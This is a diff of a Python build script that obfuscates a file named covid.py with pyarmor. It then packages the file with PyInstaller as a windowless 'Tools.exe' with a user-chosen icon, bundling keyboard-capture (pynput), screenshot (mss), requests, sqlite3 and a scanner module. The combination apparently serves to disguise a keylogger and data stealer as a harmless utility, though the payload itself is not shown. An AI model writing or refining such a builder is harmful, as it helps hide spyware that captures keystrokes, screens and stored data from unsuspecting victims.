@@ -1,6 +1,14 @@
 import os
 import subprocess
+import shutil
 from tkinter import Tk, filedialog
+
+
+def run(cmd):
+    result = subprocess.run(cmd)
+    if result.returncode != 0:
+        exit(1)
+
 
 def builder():
     root = Tk()
@@ -13,28 +21,55 @@ def builder():
 
     if not icon_path:
         print("Aucune icône choisie")
-        exit()
+        return
 
     output_dir = "covid-exe"
+    build_dir = "build"
+    dist_dir = "dist"
+    obf_dir = "obf"
+
     os.makedirs(output_dir, exist_ok=True)
 
-    subprocess.run([
+    for d in [build_dir, dist_dir, obf_dir]:
+        if os.path.exists(d):
+            shutil.rmtree(d)
+
+    run([
         "pyarmor",
         "gen",
+        "-O", obf_dir,
         "covid.py"
     ])
 
-    subprocess.run([
+    target_file = os.path.join(obf_dir, "covid.py")
+    scanner_path = os.path.abspath("scanner.py")
+
+    run([
         "pyinstaller",
         "--onefile",
         "--noconsole",
+        "--clean",
         "--name", "Tools",
         "--distpath", output_dir,
+        "--workpath", build_dir,
+        "--specpath", build_dir,
         "--icon", icon_path,
-        "dist/covid.py"  
-    ])
 
-    print(f"Terminé -> {output_dir}/Tools.exe")
+        "--paths=.",
+
+        "--hidden-import=requests",
+        "--hidden-import=pynput.keyboard",
+        "--hidden-import=mss",
+        "--hidden-import=sqlite3",
+
+        "--collect-binaries", "sqlite3",
+
+        "--add-data", f"{scanner_path};.",
+
+        target_file
+    ])
+    print(f"\n[✓] Terminé -> {output_dir}/Tools.exe")
+
 
 if __name__ == "__main__":
     builder()
